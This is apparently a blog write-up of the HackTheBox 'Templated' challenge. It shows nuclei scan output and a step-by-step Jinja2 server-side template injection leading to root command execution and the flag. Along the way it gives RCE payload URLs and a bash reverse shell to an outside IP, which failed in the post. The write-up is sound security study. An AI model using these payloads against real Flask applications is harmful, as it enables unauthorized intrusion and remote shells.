---
layout: post
title: HTB — Challenge — Templated
date: 2023-01-20 00:00:00 -500
categories: [HackTheBox]
tags: [WEB, Server-Side Template Injection]
---

***

<center><strong><font color="White">Can you exploit this simple mistake?</font></strong></center>

***

## <strong><font color="#34A5DA">Reccon</font></strong>

### <font color="#FFA500">nuclei</font>

```
[tech-detect:python] [http] [info] http://161.35.162.53:31121
[INF] Using Interactsh Server: oast.fun
[options-method] [http] [info] http://161.35.162.53:31121 [OPTIONS, GET, HEAD]
[http-missing-security-headers:access-control-allow-headers] [http] [info] http://161.35.162.53:31121
[http-missing-security-headers:referrer-policy] [http] [info] http://161.35.162.53:31121
[http-missing-security-headers:clear-site-data] [http] [info] http://161.35.162.53:31121
[http-missing-security-headers:access-control-allow-methods] [http] [info] http://161.35.162.53:31121
[http-missing-security-headers:permissions-policy] [http] [info] http://161.35.162.53:31121
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://161.35.162.53:31121
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://161.35.162.53:31121
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://161.35.162.53:31121
[http-missing-security-headers:access-control-allow-origin] [http] [info] http://161.35.162.53:31121
[http-missing-security-headers:access-control-expose-headers] [http] [info] http://161.35.162.53:31121
[http-missing-security-headers:strict-transport-security] [http] [info] http://161.35.162.53:31121
[http-missing-security-headers:x-frame-options] [http] [info] http://161.35.162.53:31121
[http-missing-security-headers:x-content-type-options] [http] [info] http://161.35.162.53:31121
[http-missing-security-headers:access-control-max-age] [http] [info] http://161.35.162.53:31121
[http-missing-security-headers:content-security-policy] [http] [info] http://161.35.162.53:31121
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://161.35.162.53:31121
[http-missing-security-headers:access-control-allow-credentials] [http] [info] http://161.35.162.53:31121
[robots-txt-endpoint] [http] [info] http://161.35.162.53:31121/robots.txt
```

### <font color="#FFA500">Searching for vulnerabilities</font>

All we can see here is that "site under construction". There is nothing can be found in site inspection.

robots.txt is 404.

Next searching for Jinja2 which is used on website I found a [vulnerability](https://www.exploit-db.com/exploits/46386) on exploit-db. 


Trying: `161.35.162.53:31121/{{4*4}}` we get "The page '16' could not be found". So we have some type of template injection. Changing that to `whoami` or `ls` does not print anything.

`http://161.35.162.53:31121/{{config}}` gives us:

```
The page '<Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>' could not be found
```

Following this article: [link](https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/)

1. `http://161.35.162.53:31121/{{'abc'.__class__.__base__.__subclasses__()}}`
2. Here we should find the index of `_io._IOBase` class. First i just used number 95, it showed me the name of class I was directing to, then I went back to list of subclasses, searched for the one I was directed to and the IOBase one, then just addding needed number to the index.
3. `http://161.35.162.53:31121/%7B%7B'abc'.__class__.__base__.__subclasses__()[101]%7D%7D`
4. `http://161.35.162.53:31121/%7B%7B'abc'.__class__.__base__.__subclasses__()[101].__subclasses__()[0].__subclasses__()[0]%7D%7D` reterns `'<class '_io.FileIO'>'`

Do not know why, but `http://161.35.162.53:31121/%7B%7B'abc'.__class__.__base__.__subclasses__()[101].__subclasses__()[0].__subclasses__()[0]('/etc/passwd').read()%7D%7D` did not work.

However, `http://161.35.162.53:31121/{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}` printed:

```
uid=0(root) gid=0(root) groups=0(root)
```

### <font color="#FFA500">Reverse shell</font>

`http://161.35.162.53:31121/{{request.application.__globals__.__builtins__.__import__('os').popen("bash -c 'bash -i >& /dev/tcp/10.10.14.11/4004 0>&1'").read()}}`

I do not know why, but I tried getting reverse shell, but it failed. Maybe it's blocking outcoming connection somehow. 

### <font color="#FFA500">Reading flag</font>

`http://161.35.162.53:31121/{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}`

`http://161.35.162.53:31121/{{request.application.__globals__.__builtins__.__import__('cat flag.txt').popen('ls').read()}}` redirects to google, so we need to replace ' ' (space) with `%20`

`http://161.35.162.53:31121/{{request.application.__globals__.__builtins__.__import__('os').popen('cat%20flag.txt').read()}}`

Finally, our flag: `HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!}`